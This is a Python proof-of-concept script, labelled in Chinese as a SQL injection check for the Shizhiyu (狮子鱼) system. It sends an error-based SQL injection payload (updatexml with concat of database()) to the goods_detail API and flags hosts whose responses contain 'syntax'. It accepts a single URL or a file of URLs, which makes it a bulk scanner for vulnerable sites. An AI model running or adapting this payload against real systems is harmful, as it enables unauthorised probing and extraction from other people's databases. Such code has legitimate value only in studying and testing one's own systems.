# -*- coding:utf-8 -*-
import abc
from base64 import decodebytes
from logging import fatal
from os import name
import requests
from requests.models import parse_url
import urllib3
import argparse

urllib3.disable_warnings() # 忽略https证书告警

parser = argparse.ArgumentParser(description='帮助文档')
parser.add_argument('-u','--url',help='后面跟url地址',default='')
parser.add_argument('-f','--file',help='后面接文件名',default='')
args = parser.parse_args()
name='''

    狮子鱼sql注入

'''
print(name)

def poc(url):
    url1 = url + "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"
    headers = {
        "user-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        r= requests.get(url=url1,headers=headers,timeout=17,verify=False)
        print("正在测试：",url)
        if "syntax" in r.text:
            print(url+"系统存在sql漏洞")
        print("*"*80)

    except:
        print("请求失败！")
        print("*"*80)

def abc(file):
    f = open(file,'r')
    for i in f.readlines():
        i = i.strip()
        #print("~"*80)
        print(i)
        #print("~"*80)
        poc(i)
        print("\n")
if __name__ == '__main__':
	if args.url !="" and args.file =="" :
		poc(args.url)
	if args.url =="" and args.file !="" :
		abc(args.file)

